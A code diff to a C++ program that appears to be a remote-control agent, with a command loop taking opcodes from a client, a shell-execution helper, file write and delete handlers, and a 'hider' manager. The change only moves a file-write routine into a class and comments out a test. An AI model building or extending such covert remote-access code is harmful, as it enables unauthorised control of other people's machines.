@@ -29,29 +29,17 @@ int main() {
 
     return EXIT_SUCCESS;
 }
-
-void testSoftwareManeger() {
-    SoftwareManeger swm = SoftwareManeger();
-    swm.chunkWrite("tempSwmTest.txt", false, "this is my first test\n");
-    swm.chunkWrite("tempSwmTest.txt", 1, "this is my second test\n");
+// & outdated
+// void testSoftwareManeger() {
+//     SoftwareManeger swm = SoftwareManeger();
+//     swm.fileWrite("tempSwmTest.txt", false, "this is my first test\n");
+//     swm.chunkWrite("tempSwmTest.txt", 1, "this is my second test\n");
     
-    swm.deleteFile("tempSwmTest.txt");
+//     swm.deleteFile("tempSwmTest.txt");
 
-}
+// }
 
-Status fileWrite(Client& client, std::string param, SoftwareManeger& swm)
-{
-    bool isAppend = false;
-    char buffer[BUFFER_SIZE] = {0};
-    Status res = SUCCSESS;
-    
-    while (client.recvData(buffer) > 0 && res == SUCCSESS)
-    {
-        res = swm.chunkWrite(param, isAppend, buffer);
-        isAppend = true;
-    }
-    return res;
-}
+
 
 std::string execBash(const char* cmd) {
     std::array<char, 128> buffer;
@@ -84,7 +72,7 @@ void loopIter(Client& client, SoftwareManeger& swm, HiderManeger hiderManeger)
     switch (fncode)
     {
     case WRITE_FILE:
-        fileWrite(client, param, swm);
+        swm.fileWrite(client, param);
         break;
 
     case DELETE_FILE:
